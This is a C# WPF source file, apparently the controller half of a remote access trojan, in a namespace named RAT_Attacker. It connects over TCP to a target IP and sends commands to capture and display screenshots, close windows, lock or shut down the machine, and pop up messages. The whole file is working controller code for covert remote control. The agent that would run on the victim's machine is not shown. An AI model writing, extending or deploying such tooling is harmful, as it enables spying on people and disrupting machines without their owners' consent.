using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media.Imaging;

namespace RAT_Attacker
{
    /*
     * play audio
     */

    public partial class MainWindow : Window
    {
        Socket client;
        Encoding encoding = Encoding.GetEncoding(1251);
        
        public MainWindow()
        {
            InitializeComponent();
        }

        private void SendCommand(string command)
        {
            client = new Socket(SocketType.Stream, ProtocolType.Tcp);
            try
            {
                client.Connect(new IPEndPoint(IPAddress.Parse(addressTextBox.Text), 80));
                client.Send(encoding.GetBytes(command));
            }
            catch (SocketException ex)
            {
                if (ex.SocketErrorCode == SocketError.ConnectionRefused)
                {
                    MessageBox.Show("Cannot connect", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void CloseActiveWindow(object sender, RoutedEventArgs e)
        {
            SendCommand("CloseActiveWindow");
        }

        private void ShowMessageBox(object sender, RoutedEventArgs e)
        {
            SendCommand("ShowMessageBox");
        }

        private void TakeScreenshot(object sender, RoutedEventArgs e)
        {
            SendCommand("TakeScreenshot");

            byte[] buffer = new byte[128_000];
            client.Receive(buffer);

            BitmapImage bitmapImage = new BitmapImage();
            bitmapImage.BeginInit();
            bitmapImage.StreamSource = new MemoryStream(buffer);
            bitmapImage.EndInit();

            image.Source = bitmapImage;
        }

        private void Lock(object sender, RoutedEventArgs e)
        {
            SendCommand("Lock");
        }

        private void Shutdown(object sender, RoutedEventArgs e)
        {
            SendCommand("Shutdown");
        }

        private void SendMessage(object sender, RoutedEventArgs e)
        {
            string trimmedText = messageTextBox.Text.Trim(' ');
            if (trimmedText != "")
            {
                SendCommand("Message: " + trimmedText);
                messageTextBox.Clear();
            }
        }

        private void MessageTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
                SendMessage(sender, e);
        }
    }
}
